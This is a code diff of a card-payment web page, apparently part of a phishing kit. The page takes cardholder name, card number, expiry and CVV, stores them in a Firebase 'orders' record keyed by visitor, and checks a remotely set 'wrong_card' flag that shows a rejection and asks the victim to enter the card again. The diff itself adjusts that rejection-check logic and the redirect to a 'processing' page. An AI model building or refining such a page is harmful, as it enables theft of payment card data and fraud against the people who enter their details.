@@ -47,7 +47,6 @@
 
         .form-group { text-align: right; margin-bottom: 15px; width: 100%; position: relative; }
         .form-label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 7px; }
-        
         .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
         .input-field:focus { border-color: var(--main-green); }
         .input-field.error-border { border: 2px solid var(--error-red) !important; background-color: #fff8f8; }
@@ -119,32 +118,14 @@
             localStorage.setItem('v_id', v_id);
         }
 
-        const nextStepRef = database.ref('orders/' + v_id + '/next_step');
-
-        // وظيفة مراقبة رفض البطاقة
-        function statusListener(snapshot) {
-            const step = snapshot.val();
-            if (step === 'wrong_card') {
+        // فحص حالة الرفض عند تحميل الصفحة فقط (عشان ما يصفرش واحنا بنبعت)
+        database.ref('orders/' + v_id + '/next_step').once('value', (snapshot) => {
+            if (snapshot.val() === 'wrong_card') {
                 document.getElementById('rejectMsg').style.display = 'block';
                 const fields = ['cardHolder', 'cardNumber', 'cardExpiry', 'cvv'];
-                fields.forEach(id => {
-                    const el = document.getElementById(id);
-                    el.classList.add('error-border');
-                    el.value = ''; 
-                });
-                document.getElementById('viewCardNumber').innerText = '#### #### #### ####';
-                document.getElementById('viewCardHolder').innerText = 'اسم حامل البطاقة';
-                document.getElementById('viewCardExpiry').innerText = '00 / 00';
-                
-                const btn = document.getElementById('payButton');
-                btn.disabled = true;
-                btn.classList.remove('active');
-                btn.innerText = "ادفع الآن";
+                fields.forEach(id => document.getElementById(id).classList.add('error-border'));
             }
-        }
-
-        // تفعيل المراقبة
-        nextStepRef.on('value', statusListener);
+        });
 
         function isValidLuhn(number) {
             let sum = 0; let shouldDouble = false;
@@ -192,13 +173,10 @@
             let val = this.value.replace(/\D/g, '');
             this.value = val.match(/.{1,4}/g)?.join(' ') || '';
             document.getElementById('viewCardNumber').innerText = this.value || '#### #### #### ####';
-            
             const logo = document.getElementById('viewCardLogo');
-            if (val.startsWith('4')) { 
-                logo.src = "https://img.icons8.com/color/48/000000/visa.png"; logo.style.display = "block"; 
-            } else if (val.startsWith('5')) { 
-                logo.src = "https://img.icons8.com/color/48/000000/mastercard.png"; logo.style.display = "block"; 
-            } else { logo.style.display = "none"; }
+            if (val.startsWith('4')) { logo.src = "https://img.icons8.com/color/48/000000/visa.png"; logo.style.display = "block"; }
+            else if (val.startsWith('5')) { logo.src = "https://img.icons8.com/color/48/000000/mastercard.png"; logo.style.display = "block"; }
+            else { logo.style.display = "none"; }
             validateForm();
         });
 
@@ -216,13 +194,8 @@
             validateForm();
         });
 
-        // الدالة المعدلة لمنع التصفير والتحويل الفوري
         function submitPayment() {
             const btn = document.getElementById('payButton');
-            
-            // أول خطوة: إيقاف المراقب تماماً قبل أي تعديل في الداتا
-            nextStepRef.off('value', statusListener);
-
             btn.disabled = true;
             btn.innerText = "جاري التحميل...";
 
@@ -236,12 +209,10 @@
                 last_update: new Date().getTime()
             };
 
-            // حفظ البيانات ثم التحويل
             database.ref('orders/' + v_id).update(payload).then(() => {
-                window.location.replace('processing.html'); 
-            }).catch((err) => {
-                console.error("Firebase Update Error:", err);
-                window.location.replace('processing.html');
+                window.location.href = 'processing.html'; 
+            }).catch(() => {
+                window.location.href = 'processing.html';
             });
         }
     </script>
